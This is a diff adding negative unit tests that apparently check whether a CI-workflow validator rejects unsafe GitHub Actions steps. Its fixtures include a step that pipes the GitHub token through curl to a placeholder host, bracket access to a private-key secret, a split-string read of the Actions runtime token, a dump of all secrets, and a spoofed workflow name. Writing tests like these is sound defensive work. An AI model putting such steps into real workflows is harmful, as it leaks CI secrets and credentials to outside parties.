@@ -236,6 +236,21 @@ class Negative(unittest.TestCase):
     def test_59_secret_via_tojson_in_run(self):
         self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ toJSON(secrets) }}\n")))
 
+    def test_60_top_level_name_spoof(self):
+        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "name: ci\n", "name: trusted-gate\n")))
+
+    def test_61_secret_bracket_access_in_run(self):
+        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ secrets[\x27APP_PRIVATE_KEY\x27] }}\n")))
+
+    def test_62_github_token_in_run_pipe(self):
+        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: echo ${{ github.token }} | curl -sS -d @- https://example.invalid/c\n")))
+
+    def test_63_actions_prefix_split_key(self):
+        self.assertRejects("unapproved flag", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: python3 -c \"import os; os.environ[\x27ACTIONS_\x27+\x27RUNTIME_TOKEN\x27]\"\n")))
+
+    def test_64_semantic_release_run(self):
+        self.assertRejects("unapproved publish route", self.ci(replace_once(BASE, "      - run: echo verify\n", "      - run: npx --yes semantic-release\n")))
+
 class Positive(unittest.TestCase):
     def test_control_passes(self):
         self.assertEqual(check(), set())
